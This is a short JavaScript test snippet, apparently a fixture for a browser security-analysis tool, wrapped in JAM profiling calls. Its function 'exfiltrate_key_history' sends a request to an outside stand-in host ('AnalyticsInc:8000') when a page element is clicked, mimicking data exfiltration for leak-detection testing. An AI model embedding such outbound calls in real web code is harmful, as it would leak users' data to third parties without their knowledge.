
JAM.startProfile('load');
function exfiltrate_key_history() {
  newreq = XMLHttpRequest;
  xmlhttp = new newreq;
  xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=clone4", true);
  xmlhttp.send(null)
}
document.getElementById("test").onclick = exfiltrate_key_history;

JAM.stopProfile('load');
